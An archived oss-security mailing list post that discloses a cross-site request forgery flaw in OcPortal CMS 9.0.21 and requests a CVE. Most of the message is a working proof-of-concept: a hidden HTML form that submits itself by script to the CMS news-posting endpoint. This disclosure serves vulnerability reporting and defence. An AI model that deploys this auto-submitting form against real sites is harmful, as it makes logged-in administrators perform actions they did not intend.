@@ -1,0 +1,212 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - OcPortal CMS 9.0.21 – Cross-site Request Forgery (CSRF) Vulnerability</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="../../../2015/12/20/1">[&lt;prev]</a> <a href="2">[next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;CAMWaY3MVToDoHyw2ksecJqbBC2NyyiDDvN=_RM12q5XdJP9+DQ&#64;mail.gmail.com&gt;
+Date: Mon, 21 Dec 2015 01:50:31 +0000
+From: CSW Research Lab &lt;disclose&#64;...ersecurityworks.com&gt;
+To: "cve-assign&#64;...re.org" &lt;cve-assign&#64;...re.org&gt;, 
+	"oss-security&#64;...ts.openwall.com" &lt;oss-security&#64;...ts.openwall.com&gt;
+Subject: OcPortal CMS 9.0.21 – Cross-site Request Forgery (CSRF) Vulnerability
+
+Hi all
+
+Can you please assign cve for this issue?
+
+<a href="http://ocportal.com/tracker/view.php?id=2074" rel="nofollow">http://ocportal.com/tracker/view.php?id=2074</a>
+
+Proof of Concept Code
+***************************
+&lt;!DOCTYPE&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;title&gt;OcPortal 9.0.21 CSRF Vulnerability POC&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;form action="
+<a href="http://localhost/ocportal/cms/index.php?page=cms_news&amp;type=_ad&amp;uploading=1" rel="nofollow">http://localhost/ocportal/cms/index.php?page=cms_news&amp;type=_ad&amp;uploading=1</a>"
+enctype="multipart/form-data" method="post" id="formid"&gt;
+&lt;input type="hidden" name="MAX_FILE_SIZE" value="16777216" /&gt;
+&lt;input type="hidden" name="file1" value="" /&gt;
+&lt;input type="hidden" name="tick_on_form__validated" value="0" /&gt;
+&lt;input type="hidden" name="label_for__allow_rating" value="Allow rating" /&gt;
+&lt;input type="hidden" name="f_face" value="/" /&gt;
+&lt;input type="hidden" name="require__author" value="1" /&gt;
+&lt;input type="hidden" name="label_for__title" value="Title" /&gt;
+&lt;input type="hidden" name="file" value="" /&gt;
+&lt;input type="hidden" name="label_for__meta_description" value="Concise
+description" /&gt;
+&lt;input type="hidden" name="require__meta_description" value="0" /&gt;
+&lt;input type="hidden" name="validated" value="1" /&gt;
+&lt;input type="hidden" name="label_for__meta_keywords[]1" value="Keywords" /&gt;
+&lt;input type="hidden" name="label_for__meta_keywords[]0" value="Keywords" /&gt;
+&lt;input type="hidden" name="meta_description" value="Attack_OcPortal" /&gt;
+&lt;input type="hidden" name="allow_comments" value="1" /&gt;
+&lt;input type="hidden" name="comcode__news" value="1" /&gt;
+&lt;input type="hidden" name="http_referer" value="
+<a href="http://localhost/ocportal/cms/index.php?page=cms_news&amp;type=ad" rel="nofollow">http://localhost/ocportal/cms/index.php?page=cms_news&amp;type=ad</a>" /&gt;
+&lt;input type="hidden" name="author" value="Attack_OcPortal" /&gt;
+&lt;input type="hidden" name="pre_f_notes" value="1" /&gt;
+&lt;input type="hidden" name="post__is_wysiwyg" value="1" /&gt;
+&lt;input type="hidden" name="label_for__file" value="Image" /&gt;
+&lt;input type="hidden" name="comcode__title" value="1" /&gt;
+&lt;input type="hidden" name="require__news_category" value="0" /&gt;
+&lt;input type="hidden" name="allow_rating" value="1" /&gt;
+&lt;input type="hidden" name="tick_on_form__allow_rating" value="0" /&gt;
+&lt;input type="hidden" name="require__allow_comments" value="0" /&gt;
+&lt;input type="hidden" name="label_for__validated" value="Validated" /&gt;
+&lt;input type="hidden" name="label_for__notes" value="Notes" /&gt;
+&lt;input type="hidden" name="label_for__post" value="News article" /&gt;
+&lt;input type="hidden" name="meta_keywords[]" value="Attack_OcPortal" /&gt;
+&lt;input type="hidden" name="label_for__main_news_category" value="Main
+category" /&gt;
+&lt;input type="hidden" name="f_size" value="" /&gt;
+&lt;input type="hidden" name="require__allow_rating" value="0" /&gt;
+&lt;input type="hidden" name="label_for__author" value="Source" /&gt;
+&lt;input type="hidden" name="require__title" value="1" /&gt;
+&lt;input type="hidden" name="comcode__post" value="1" /&gt;
+&lt;input type="hidden" name="news" value="Attack_OcPortal" /&gt;
+&lt;input type="hidden" name="post" value="Attack_OcPortal" /&gt;
+&lt;input type="hidden" name="require__validated" value="0" /&gt;
+&lt;input type="hidden" name="news__is_wysiwyg" value="1" /&gt;
+&lt;input type="hidden" name="require__notes" value="0" /&gt;
+&lt;input type="hidden" name="label_for__allow_comments" value="Allow
+comments" /&gt;
+&lt;input type="hidden" name="posting_ref_id" value="13973" /&gt;
+&lt;input type="hidden" name="f_colour" value="" /&gt;
+&lt;input type="hidden" name="label_for__news" value="News summary" /&gt;
+&lt;input type="hidden" name="require__meta_keywords" value="0" /&gt;
+&lt;input type="hidden" name="notes" value="Attack_OcPortal" /&gt;
+&lt;input type="hidden" name="title" value="Attack_OcPortal" /&gt;
+&lt;input type="hidden" name="require__file" value="0" /&gt;
+&lt;input type="hidden" name="require__main_news_category" value="1" /&gt;
+&lt;input type="hidden" name="label_for__news_category" value="Secondary
+categories" /&gt;
+&lt;input type="hidden" name="main_news_category" value="7" /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById('formid').submit();
+&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+
+Credits &amp; Authors
+**********************
+Arjun Basnet from Cyber Security Works Pvt. Ltd. (
+<a href="http://cybersecurityworks.com" rel="nofollow">http://cybersecurityworks.com</a>)
+
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
